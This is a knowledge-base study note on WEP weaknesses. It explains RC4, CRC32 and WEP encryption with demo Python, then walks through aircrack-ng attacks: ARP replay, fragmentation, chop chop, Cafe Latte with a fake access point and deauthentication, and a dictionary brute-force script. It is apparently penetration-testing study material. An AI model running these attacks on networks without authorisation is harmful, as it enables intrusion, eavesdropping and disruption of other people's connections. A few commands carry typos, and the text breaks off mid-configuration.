---
tags:
  - knowledge-base
  - wep
  - aireplay-ng
  - airmon-ng
  - airodump-ng
  - wi-fi
  - korek
  - arpreplay
  - fragmentation
  - aircrack-ng
  - cafelatte
  - airbase-ng
  - airdecap-ng
category: wifi
---

## WEP Overview

Open networks are vulnerable to eavesdropping because their traffic is not encrypted. To address this, Wired Equivalent Privacy (WEP) was introduced in 1997 as part of the [IEEE 802.11](https://www.ieee802.org/11/) standard. It aimed to provide a level of privacy for data transmitted over wireless networks.

WEP, being an older standard, offers valuable lessons for us when dealing with communication ciphers. It has since been replaced by Wi-Fi Protected Access, but can still be found in some business environments. WEP makes use of initialization vectors (IVs), a 40-bit or 104-bit shared key (also referred to as the WEP key), the Rivest Cipher 4 (RC4) algorithm, and cyclic redundancy checks (CRC32) to provide encryption for wireless communications. When WEP was developed, it originally incorporated a 24-bit initialization vector due to U.S. government export restrictions on cryptographic technologies, which limited key sizes. After these restrictions were lifted, WEP was updated to support a 128-bit encryption key, but incidentally it continued to use the same 24-bit initialization vector.

Although WEP held firm as a standard for a while, the discovery of different attacks led to multiple ways of compromising the shared key. This is due to the initialization vectors and cyclic redundancy checks used in the overall cipher. Regardless of whether WEP uses a 64-bit or 128-bit encryption key, the IV remains 24 bits. As a result, the algorithm is prone to repeated IVs during transmission. This has since enabled adversaries to construct decryption tables and retrieve the key with a high degree of statistical certainty, typically through packet building and replay attacks.

### RC4 Algorithm

In cryptography, `RC4 (Rivest Cipher 4)`, also known as `ARC4` or `ARCFOUR (Alleged RC4)`, is a stream cipher. It was designed by Ron Rivest of [RSA Security](https://en.wikipedia.org/wiki/RSA_Security) in 1987 and became part of several commonly used encryption protocols and standards (including WEP) due to its simplicity and high speed.

RC4 is a symmetric cipher, which means the same key is used for both encryption and decryption. It generates a stream of bits that are XORed with the plaintext to produce the ciphertext. To decrypt the data, the ciphertext is XORed with the same key stream to recover the plaintext.

RC4 consists of two key components:

1. Key Scheduling Algorithm (KSA)
2. Pseudo Random Generation Algorithm (PRGA)

The `Key Scheduling Algorithm` initializes the state table using the WEP key and the initialization vector (IV). The `Pseudo Random Generation Algorithm` produces the keystream used for the encryption and decryption process. In the upcoming section, we will delve deeper into the RC4 algorithm, exploring its mechanisms and functionality in greater detail.

### WEP Authentication

WEP supports two types of authentication systems: `Open` and `Shared`. In open authentication, a client does not provide any credentials when connecting to the access point (AP). However, to encrypt and decrypt data frames, the client must have the correct key.

In shared authentication, a challenge text is sent to the client during the authentication process. The client must encrypt this challenge text with the WEP key and send it back to the AP for verification. This process allows the client to prove that it knows the key. Upon receiving the encrypted challenge text, the AP attempts to decrypt it. If the decryption is successful and the decrypted text matches the original challenge text, the client is permitted to associate with the access point.

Below is a step-by-step description of the shared WEP authentication process, which can be visualized in the diagram above:

1. `Authentication Request`: The process begins with the client sending an authentication request to the access point.
2. `Challenge`: The access point responds with a custom authentication response that includes challenge text for the client.
3. `Challenge Response`: The client then replies with the encrypted challenge, which is encrypted using the WEP key.
4. `Verification`: The AP decrypts the challenge, and sends back an indication of success or failure.

The use of WEP is less common in modern environments, but can still be encountered in older systems with compatibility issues.

## WEP Encryption Algorithm Overview

Wired Equivalent Privacy utilizes 40-bit or 104-bit keys in combination with a 24-bit initialization vector to create the seed. Due to the correlation between the two, the [FMS (Fluhrer, Mantin, and Shamir)](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack) and [PTW (Pyshkin, Tews, and Weinmann)](https://eprint.iacr.org/2007/120.pdf) attacks allow us to retrieve a correct key after gathering enough packets. Alternatively, brute force attacks exist on a per-packet basis, which also allow us to retrieve the key. Packet-building attacks, such as ARP replay, fragmentation, and others, enable us to expedite the process of initialization vector generation. The goal is to collect enough initialization vectors in a capture file to crack the key using probability algorithms.

![wep_encryption_algorithm_overview](../../Images/HTB/wep_encryption_algorithm_overview.png)

The algorithm for WEP follows a fairly standard procedure for generating a keystream through the RC4 algorithm, which then undergoes a bitwise operation with the packet plaintext and cyclic redundancy check. It can be broken down into the following steps:

- The 24-bit `Initialization Vector (IV)` is generated.
- The `40-bit` or `104-bit Key` is combined with the initialization vector to make the `Seed`.
- The `Seed` is passed through the stages of the RC4 algorithm, which includes the Key Scheduling Algorithm and the Pseudo Random Generation Algorithm, to create the `Keystream`.
- The `Cyclic Redundancy Check` is calculated and appended to the `Packet Plain Text`, forming the `ICV message`.
- The unencrypted `ICV message` and `Keystream` undergo a `XOR Bitwise Operation` to produce the `Final Ciphertext`.
- The IV is concatenated with the final ciphertext, resulting in the `final message` to be transmitted.

At a high level, the algorithm for Wired Equivalent Privacy (WEP) utilizes random seeds. However, the 24-bit initialization vector (IV) has a limited range, making it prone to repetition. In tandem with this, the IV is transmitted in cleartext alongside the encrypted data. This is where the problem innately lies: we know one of the two inputs for the RC4 algorithm, which allows us to limit our guesses and use probability-based analysis to determine the key. As a result, attackers are able to crack the key much more quickly than any WPA network.

### Seed Generation and RC4

In order to fully utilize RC4 encryption, two main inputs are required. The first is the message to be encrypted. The second input is the key, which, in standard RC4, is directly passed into the algorithms that initialize the cipher. However, in the case of WEP, the key is actually a `'seed'` formed by concatenating a randomly generated 24-bit initialization vector (IV) with a 40-bit, 104-bit, or in some cases, 232-bit general key.

The RC4 algorithm operates in two phases: the `Key Scheduling Algorithm (KSA)` and the `Pseudo-Random Generation Algorithm (PRGA)`. The KSA initializes and permutates the internal state array, using the key (or seed, in WEP's case) to shuffle its values. This shuffled array is then processed by the PRGA, which produces a keystream of the same length as the plaintext message. The keystream is XORed with the message to generate the ciphertext.

The Python `PyCryptodome` library has an [ARC4](https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html) module for this very purpose.

With this example script, our goal is to encrypt the phrase 'Wired Equivalent Privacy' with both a 64-bit and 128-bit seed. First, we generate the random 3-byte initialization vector (IV) using `get_random_bytes`. We then concatenate the IV and Key together to make the full seed. The seed is passed into the two phases of the RC4 algorithm to create the keystream, which is then XORed with our 'Wired Equivalent Privacy Message'.

```python
import Crypto
from Crypto.Random import get_random_bytes
import binascii
from Crypto.Cipher import ARC4

# Generating the 24-bit (3 byte) Initialization Vector
IV = get_random_bytes(3)

# Creating the 40-bit key (5 bytes)
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key

# We can also use a 104-bit key (13 bytes) 
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104

print('Initialization Vector: ' + str(IV))
print('64-bit Seed: ' + str(Seed64))
print('128-bit Seed: ' + str(Seed128))

# We must use the RC4 cipher to encrypt the plain text. We will explore how to generate the CRC32 and ICV Message in the next session.
# The RC4 cipher consists of the Key-Scheduling Algorithm and the Pseudo-random Generation Algorithm, which outputs the keystream.

# Generating the keystream using RC4
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# The plain text is XORed with the keystream to produce the ciphertext.
msg = keystream.encrypt(b'Wired Equivalent Privacy')
print(msg)
```

It is worth noting that each iteration of this cipher is different, as the initialization vector is randomly generated per packet. Generally, stream ciphers use a key that is the same length as the message being encrypted. This means that in order to decrypt the message, either the key or the original plaintext is required. However, in the case of WEP, the IV is attached to the packet. Otherwise, it would be impossible to decrypt without the full seed. The correlation between the IV and the final message has allowed attackers to break this once theoretically sound algorithm apart.

### CRC32 Generation (ICV Algorithm)

Wired Equivalent Privacy utilizes a standard [CRC32 checksum](https://fuchsia.googlesource.com/third_party/wuffs/+/HEAD/std/crc32/README.md), which is computed over the packet plaintext and subsequently appended to it. The combined plaintext/checksum block is then XORed with the RC4 keystream to produce the final ciphertext. The `KoreK Chop Chop Attack` is notorious for abusing the CRC32 hashing function to decrypt a packet without knowing the key. Simply put, this is done by removing a byte of the final ciphertext, calculating the new ICV, then sending the modified packet back to the network. Based on the network's response (whether the packet is accepted or rejected), the attacker can infer the byte's true value. By repeating this process for each byte, the attacker can gradually decrypt the entire packet. W

Generally, the CRC32 hashing algorithm is the following:

`g(x) = x32 + x26 + x23 + x22 + x16 + x12 + x11 + x10 + x8 + x7 + x5 + x4 + x2 + x + 1`

We can calculate the CRC32 checksum using the Python [zlib](https://docs.python.org/3/library/zlib.html#zlib.crc32) library. With the script below, we will take our packet plaintext 'Something Sensitive' and find the checksum value for it.

```python
import zlib

# First we declare our packet plaintext. In normal communications this is the actual plaintext data.
packetplaintext = b'Something Sensitive'

# We then use the zlib library to calculate the CRC32.
crc32 = zlib.crc32(packetplaintext)

print(crc32)
```

### Putting the Algorithms Together

We can put together the Seed Generation and CRC32 Generation scripts with the RC4 library to construct a complete mockup of the WEP algorithm. In this combined script, we first add the initialization vector (IV) and the key, forming the seed. Next, we use the seed to produce the keystream. We then create our message to be encrypted by calculating the CRC32 checksum and concatenating it with our packet plaintext. The resulting plaintext block is subsequently passed into RC4's encrypt function to generate our final ciphertext. Lastly, the initialization vector is prepended to the final ciphertext, resulting in our final message to be transmitted.

```python
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import binascii
import zlib

# First we declare our packet plain text, this is the unencrypted message that we need to pass through our mock WEP algorithm
packetplaintext = b'Something Sensitive'

# Then we calculate the CRC32 checksum (32-bit integer) of our packet plain text
crc32 = zlib.crc32(packetplaintext)

# Generating the 24-bit Initialization Vector (3 bytes)
IV = get_random_bytes(3)

# Declaring our 40-bit key (5 bytes) and 64-bit seed (8 bytes)
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key 

# Declaring our 104-bit key (13 bytes) and 128-bit seed
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104 

# Generating the keystreams
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# Constructing our ICV Message
crc32byte = crc32.to_bytes(4, 'big')  # Convert CRC32 checksum from integer to bytes
ICVMessage = packetplaintext + crc32byte # Concatenate the packet plaintext and CRC32 checksum

# Final Ciphertext, made by XORing the ICV Message and keystream
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage) 

# Final Message, formed by concatenating the Initialization Vector with the Final Cipher Text
finalmsg = IV + msg
finalmsgb = IV + msgB


print('-------------')
print('CRC32 Checksum: ' + str(crc32))
print('Initialization Vector: ' + str(IV))
print('64-bit Seed: ' + str(Seed64))
print('128-bit Seed: ' + str(Seed128))
print('-------------')
print('ICV Message: ' + str(ICVMessage))
print('Cipher Text 64-bit Seed: ' + str(msg))
print('Cipher Text 128-bit Seed: ' + str(msgB))
print('-------------')
print('Final Message 64-bit Seed: ' + str(finalmsg))
print('Final Message 128-bit Seed: ' + str(finalmsgb))
```

## Finding the Initialization Vector in Wireshark

The `Integrity Check Value (ICV)` and `Initialization Vector (IV)` can be acquired using the Aircrack suite. We do so by listening to communications between the target access point and connected stations. The traffic will be output to a capture file, which we can open with Wireshark.

List interfaces

```bash
iwconfig
```

Start monitor mode

```bash
sudo airmon-ng start wlan0
```

Scan for a wireless network using WEP 

```bash
sudo airomon-ng wlan0mon
```

Once we know the BSSID and channel of our WEP-enabled target, we can refine the scan results to focus solely on it. Running the command again, we specify the channel the AP operates on with `-c 3` and the name of the capture file with `-w WEP`. The saved file will be used for later analysis.

```bash
sudo airomon-ng -c X --bssid XX:XX:XX:XX:XX:XX wlan0mon -w WEP
```

After scanning for a few seconds, we can terminate the session and open the capture file in Wireshark. By selecting any IEEE [802.11 data packet](https://wiki.wireshark.org/Wi-Fi) and expanding the `'IEEE 802.11 Data'` and `'WEP Parameters'` sections, we can view the packet's initialization vector (IV) along with the message ICV (CRC32). As previously mentioned, the IV is attached to the encrypted message, allowing us to extract it from the captured packets.

The more packets we capture, the more initialization vectors (IVs) we are able to obtain, making it easier to crack the key using `aircrack-ng`.

## WEP Attacks

### ARP Request Relay

The classic [ARP Request Replay Attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection) is a highly effective and reliable method for generating new initialization vectors (IVs). In this attack, an ARP packet is captured and retransmitted back to the access point (AP). This action prompts the AP to resend the packet, but with a new IV each time. The continuous replay of the same ARP packet forces the AP to respond repeatedly with different IVs. Collecting these packets with new IVs allows for the eventual determination of the WEP key.

To conduct an ARP Request Replay attack, `aireplay-ng` will be used to capture a valid ARP request, which is then replayed continuously until enough initialization vectors are gathered to crack the key (using either the `Korek/FMS` attack or the default `PTW` attack).

Enable monitor mode

```bash
sudo airmon-ng start wlan0
```

Scan and capture communication from AP

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
```

The above command will continuously scan the target access point and capture the communication, saving it into a file named `WEP-01.cap`. If there were multiple access points (APs) available and we wanted to focus on one specifically, we would use the `-b` option followed by the BSSID of the target AP.

In a second terminal, we can launch the ARP request replay attack using `aireplay-ng`. We specify the ARP request replay attack mode with `-3`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. Once a valid ARP request is captured, the tool will replay it automatically.

```bash
sudo aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

Once we have generated enough ARP traffic, we can attempt to crack the key with `aircrack-ng`. We supply the `-b` option followed by our target BSSID, along with the `WEP-01.cap` file, where all the initialization vectors are stored.

```bash
sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
```

The default cracking method in `aircrack-ng` is the `PTW (Pyshkin, Tews, Weinmann)` statistical attack, which requires approximately 20,000 initialization vectors for 64-bit keys and 40,000 or more for 128-bit keys. To use the `Korek/FMS` attack, we can specify `-K` in the command, though it requires significantly more IVs—around 250,000 for 64-bit keys and 1.5 million for 128-bit keys—making it slower compared to the PTW attack.

### Fragmentation

 If no ARP requests are being made, we can use a [Fragmentation Attack](https://www.aircrack-ng.org/doku.php?id=fragmentation) instead. This attack achieves the same goal, but through an entirely different method: using fragmented packets to recover the PRGA (Pseudo Random Generation Algorithm) keystream.

PRGA bytes allow us to forge any packet. This works because encryption in WEP is simply a XOR operation between the PRGA and the plaintext message. Knowing this, we can use any IV to encrypt arbitrary data. Similarly, if both a packet's plaintext and ciphertext are known, the PRGA can be derived.

In 802.11 communications, almost all packets are encapsulated with an [LLC/SNAP header](https://dox.ipxe.org/structieee80211__llc__snap__header.html). The first 7 bytes of this header are always the same, and the 8th byte varies based on whether the packet is ARP or IP. Since ARP packets are always 36 bytes, they can be easily distinguished from IP packets. When we capture a packet, we immediately know at least 8 bytes of plaintext, and thus can derive 8 bytes of the PRGA.

Fragmentation further accelerates the process of PRGA recovery. Because WEP encryption is applied to each individual fragment, we can exploit this by crafting a long broadcast packet with known data and splitting it into smaller fragments. Each fragment allows us to leverage the 8-byte PRGA we've recovered, and when the access point reassembles these fragments, we can capture the full packet and derive even more PRGA. By repeating this process with additional fragments, we quickly collect enough keystream data (1500 bytes) to forge any packet. This allows us to subsequently craft an ARP request and perform an `ARP Request Relay` attack.

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

```bash
sudo airmon-ng start wlan0
```

We begin by scanning the target access point using `airodump-ng`, capturing the communication into a file. The interface in monitor mode is specified using `wlan0mon`, the access point's channel with `-c`, and the output location with the `-w` argument.

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
```

Next, we initiate the fragmentation attack with the following command. The `-5` option indicates the fragmentation attack, while `-b` specifies the BSSID of the AP, and `-h` is the MAC address of the connected station (or any source address that can associate with the AP).

```bash
sudo aireplay-ng -5 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

A successful fragmentation attack will display an output indicating that the PRGA `xor` file has been saved. Afterward, we need to analyze the capture file to identify the source and destination IP addresses, as well as the MAC addresses. This can be accomplished with `tcpdump`.

```bash
sudo tcpdump -s 0 -n -e -r replay_src-XXX-XXXXXX.cap
```

Once we have the required addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally the output name for the forged ARP request capture file with `-w`

```bash
sudo packetforge-ng -0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX -k 192.168.1.1 -l 192.168.1.129 -y fragment-XXX-XXXXXX.xor -w forgedarp.cap
```

> [!INFO] If the packet we captured does not contain source or destination IP addresses, we can set the **-k** (access point's IP) option to 255.255.255.255 and the **-l** (station's IP) option to 255.255.255.255. This allows us to handle packets without specified IP addresses by designating them as broadcast addresses.

Once the forged ARP request is written into `forgedarp.cap`, we can inject it into the target network to generate initialization vectors (IVs). One common method for this is using the Aircrack Suite's [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).

We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h` and our interface in monitor mode with `wlan0mon` as shown below.

```bash
sudo aireplay-ng -2 -r forgedarp.cap -h XX:XX:XX:XX:XX:XX wlan0mon
```

As this process runs, back in the `airodump-ng` output we can notice that the `Frames` count for the connected station increases. This is a positive sign that many IVs are being generated.

To further accelerate the IV generation process, we can launch an ARP request replay attack in a new terminal. This approach will enhance the rate at which new IVs are created, helping to expedite the overall process.

```bash
sudo aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

Once enough packets have been gathered, we can use aircrack-ng to crack the WEP key from the captured IVs stored in the `WEP-01.cap` file

```bash
sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
```

### Korek Chop Chop

[Korek Chop Chop Attack](https://www.aircrack-ng.org/doku.php?id=korek_chopchop) captures a packet and retrieves the 1500 bytes of PRGA. Known technically as an `Inverse Arbaugh` attack, chop chop uses inductive reasoning to decrypt the packet without needing the key.

This is achieved by abusing the Integrity Check Value (ICV) in WEP. If we recall, the ICV ensures the integrity of the transmitted message. In the case of WEP, the CRC32 algorithm is used to calculate this value; if the ICV of a packet is not valid, it will be dropped by the access point (AP) upon receipt. This seemingly benign interaction creates an opportunity for attackers.

The attack works like this: after capturing a legitimate packet, the last byte of the encrypted message is removed and assigned a value (from 0-255) that we guess, starting at zero. A series of [calculations](https://www.aircrack-ng.org/doku.php?id=chopchoptheory) is performed to determine the ICV of the truncated packet, which has a mathematical relationship to the value of the missing byte. This new packet is sent into the network as we await the AP's response. If the packet is dropped, we guess a different number and try again. If the packet isn't dropped, it means our guess was correct, thus revealing the true value of the byte. We then "chop off" the next byte and repeat the process. As the packet is decrypted byte by byte, we are able to recover the PRGA simultaneously.

With the resulting keystream data (.xor file), we are able to craft and encrypt packets that look legitimate within the network. This allows us to subsequently perform the ARP request replay attack.

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

```bash
sudo airmon-ng start wlan0
```

Scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
```

Next, we initiate the `KoreK chop chop` attack in a second terminal. The source MAC address used should be capable of associating with the network. If we need to conduct the attack without authentication and association, there are two options: either omit the `-h` flag (though this can result in dropped packets), or specify the MAC address of an already connected station, which tends to be more reliable. The `-4` option in `aireplay-ng` is used for the KoreK chop chop attack.

Similar to fragmentation attacks, we want to capture a packet originating from a connected station and destined for the AP. Once a valid packet is found, we approve the selection and start the attack, retrieving the PRGA keystream bit by bit.

```bash
sudo aireplay-ng -4 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

Analyze the decrypted packet to identify the source and destination IP addresses.

```bash
sudo tcpdump -s 0 -n -e -r replay_dec-XXXX-XXXXXX.cap
```

After identifying the required IP addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally, the output name for the forged ARP request capture file with `-w`.

```bash
sudo packetforge-ng -0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX -k 192.168.1.1 -l 192.168.1.42 -y replay_dec-XXXX-XXXXXX.xor -w forgedarp.cap
```

Once the forged packet is saved as `forgedarp.cap`, we can inject it into the target network to generate initialization vectors (IVs). One common way to do this is by using [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).

We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h`, and our interface in monitor mode with `wlan0mon` as shown below.

```bash
sudo aireplay-ng -2 -r foredarp.cap -h XX:XX:XX:XX:XX:XX wlan0mon
```

As this process runs, back in the `airodump-ng` output we can notice that the **Frames** count for the connected station increases. This is a positive sign that many new IVs are being generated.

We can wait until enough packets have been generated before attempting to crack the WEP key. Additionally, to further accelerate the IV generation process, we can use an ARP request replay attack in a new terminal. This approach will expedite the overall process.

```bash
sudo aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured Initialization Vectors (IVs) stored in the `WEP-01.cap` file.

```bash
sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
```

### Cafe Latte

The [Cafe Latte](https://www.aircrack-ng.org/doku.php?id=cafe-latte) attack exploits how WEP clients handle reauthentication requests, enabling attackers to generate traffic and capture enough IVs to crack the WEP key without requiring traffic from the AP.

The `Cafe Latte` attack can directly target the clients instead of requiring traffic.

The Cafe Latte attack is a variation of an ARP Request Replay attack aimed at connected clients. It can be likened to an evil-twin attack for WEP. To execute it, a fake access point with the same BSSID as the target network is created, running in WEP mode, and clients are deauthenticated from the target network, forcing them to reconnect to the fake access point. This setup generates the desired ARP packets, which are replayed repeatedly using the ARP request replay attack to collect enough initialization vectors (IVs) to crack the WEP key.

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

```bash
sudo airmon-ng start wlan0
```

To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
```

In a second terminal, we can start the `Cafe Latte` attack using `aireplay-ng`. We specify the Cafe Latte attack mode with `-6`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. This will listen for a station to connect, and replay any captured ARP requests to the client.

```bash
sudo aireplay-ng -6 -D -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

Once the Cafe Latte listener is running, the next step is to launch a fake access point in a third terminal. The ESSID and BSSID of this access point must match those of the target network to deceive de-authenticated clients into reconnecting and sharing their ARP requests. The `airbase-ng` tool is used to create this fake access point, with identical BSSID and ESSID to the target, operating on the same channel. Use the `-a` flag to specify the BSSID of the target AP, `-e` to set the ESSID, `-c` to select the channel, `-L` to initiate the Cafe Latte attack mode, and `-W 1` to enable WEP mode. For a complete list of command options and arguments for `airbase-ng`, refer to the documentation [here](https://www.aircrack-ng.org/doku.php?id=airbase-ng).

```bash
sudo airbase-ng -c 1 -a XX:XX:XX:XX:XX:XX -e "TargetWiFi" wlan0mon -W 1 -L 
```

This will listen for a station to connect and replay any captured ARP requests to the client. This setup will de-authenticate de-authenticated clients into reconnecting to our network, allowing us to capture their ARP requests for further analysis and attack.

Once our access point is up, we can de-authenticate the station in a fourth terminal using `aireplay-ng` to force the clients to reconnect to our fake access point.

```bash
sudo aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX wlan0mon
```

When the target station is de-authenticated, we should see changes in our second and third terminal that are indicative of our attack succeeding.

Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured initialization vectors (IVs) stored in the WEP-01.cap file.

```bash
sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
```

> [!INFO]  While executing the Cafe Latte attack, if no ARP packets are generated, it is recommended to rerun the de-authentication attack using "aireplay-ng" then immediately execute the "airbase-ng" command.

### Attacking WEP Access Points without Clients

Suppose our target network does not have any wireless clients connected and there are no ARP requests coming from any Ethernet-connected stations. In this scenario, we can perform a special `Fragmentation` or `KoreK chop chop` attack in combination with [fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication). It's important to note that while this method works on some networks, it is not universally effective, and ultimately depends on whether the network is vulnerable to fake authentication or not.

We will need three terminals for this attack. In the first terminal, we scan the target network and capture its communications using `airodump-ng`.

```bash
sudo airmon-ng start wlan0
```

Once this is running, in our second terminal we will begin packet crafting attempts. This involves using our interface's MAC address to authenticate with the access point. We employ the following command, specifying fake authentication with `-1`, the re-association interval with `1000`, the ESSID of the network with `-e`, the BSSID with `-a`, our MAC address with `-h`, and the keep-alive request interval with `-q`. Additionally, we use `-o 1` to send only one set of packets at a time.

```bash
sudo aireplay-ng -1 1000 -o 1 -q 5 -e "WirelessNetwork" -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

> [!INFO] We supply our own interface's MAC address (00:c0:ca:98:3e:e0) as the attacker.

In the `airodump-ng` output, we can confirm that fake authentication was successful as our MAC address now appears as a client connected to the AP.

Then, in a third terminal, we initiate either a fragmentation or KoreK chop chop attack. To start a KoreK chop chop attack, we use the following command, specifying the access point's BSSID with `-b` and our interface's MAC address with `-h`.

```bash
sudo aireplay-ng -4 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```

Once we have successfully captured the PRGA keystream to a `.xor` file, we will use `packetforge-ng` to forge a packet and inject it into the network with no stations. We do so with the following command, specifying the access point MAC with `-a`, our associated interface MAC with `-h`, our guessed source IP with `-l`, our guessed destination IP with `-k`, our replay file with `-y`, and write destination with `-w`. If we do not know the IP, we could just use `255.255.255.0` or `255.255.255.255`.

```bash
sudo packetforge-ng -0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX -k 192.168.1.1 -l 192.168.1.42 -y replay_dec-XXXX-XXXXXX.xor -w forgedarp.cap
```

Now that we have a forged ARP packet, we can inject it back into the network. We do so with the following command:

```bash
sudo aireplay-ng -2 -r forgedarp.cap wlan0mon
```

Once this is going, we wait several moments as the initialization vectors generate. We could also start an ARP request replay attack to speed things up, as we have done previously. Once enough traffic is generated, we can attempt to crack the key with `aircrack-ng`.

```bash
sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
```

It is worth noting that fake authentication is mostly only effective with older routers, as newer routers do not generate broadcast requests when connected via fake authentication.

### WEP Cracking
 
 It is also possible to save only the captured initialization vectors using the `--ivs` option in `airodump-ng`. Once enough IVs are captured, we can utilize the `-K` option in aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.

Start monitor mode

```bash
sudo airmon-ng start wlan0
```

Capture IVs

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP --ivs
```

Crack once enough IVs are captured

```bash
sudo aircrack-ng -K WEP.ivs
```

When attempting to crack WEP encryption, attackers typically gather enough encrypted packets using tools like `airodump-ng` and then use `aircrack-ng` to successfully decipher the key. However, there are situations where the available packet count isn't sufficient for online cracking. In such cases, the attacker may switch to an offline approach, using `dictionary` or `brute-force` methods to try and break the key.

To perform a brute-force attack, we can attempt to decrypt the packet using `airdecap-ng` with each password from the list. If a packet is successfully decrypted, it indicates that we have found the correct WEP key.

We can write a Python script that converts each 5-character password from the password list into its hexadecimal equivalent and then uses a loop to test each one with `airdecap-ng` to check if it successfully decrypts the traffic.

```python
import sys
import binascii
import re
from subprocess import Popen, PIPE
import time

# Start timer
start_time = time.time()

# File paths
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'
wordlist = []

# Read wordlist file to a list
with open(wordlist_path, 'r') as f:
    wordlist = f.readlines()

# Iterate over the wordlist
for ln, word in enumerate(wordlist, start=1):
    # Clean the line to remove non-alphanumeric characters
    key = re.sub(r'\W+', '', word)

    # Filter wordlist to only keep 5-character long words
    if len(key) != 5 :
        continue

    # Encode the WEP key to bytes and convert to hexadecimal
    hex_key = binascii.hexlify(key.encode('utf-8'))

    # Print the current attempt
    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")

    # Run airdecap-ng with the current WEP key
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode("utf-8")

    # Check if the key was successful
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        end_time = time.time()
        print(f"Total time: {end_time - start_time:.6f} seconds")
        sys.exit(0)

# If no key was found
print("No WEP key found")
```

The capture file `WEP-01.cap` is assigned to the `capture_file` variable, while the password list is loaded into the `wordlist` variable. The script then iterates through the list of passwords in a for-loop, using `airdecap-ng` to test each one. Afterwards, the script checks the output for the line containing `'Number of decrypted WEP packets'`. If the number of decrypted packets is greater than 0, it indicates that the packet was successfully decrypted and the correct WEP key has been found.

```bash
sudo python3 wep_bruteforce.py
```

With the correct key in hand, we can now decrypt any WEP-encrypted data captured during the session using `airdecap-ng`, allowing further analysis of network traffic using tools like Wireshark.

```bash
sudo airdecap-ng -w 000000000b WEP-01.cap
```

After successfully decrypting the WEP traffic with airdecap-ng, a new file will be generated, typically named something similar to `WEP-01-dec.cap`.

Opening this file in Wireshark reveals that the traffic has indeed been decrypted. We can now view the plaintext content, including network protocols, payload data, and any other information that once veiled by ciphertext.

We can also use the WEP key `'000000000b'` to connect to the Wi-Fi network.

## Connecting to WEP with the Key

### GUI

Connect with the GUI and use the hex key as the password with no colons.

### nmcli

```bash
sudo nmcli dev wifi connect <ESSID> password 00000000
```

### wpa_supplicant

```bash
cat > wep.conf << 'EOF'
network={
	ssid="PixelForge"
	key_mgmt=NONE
	wep_key0=1B2A5A4C6A
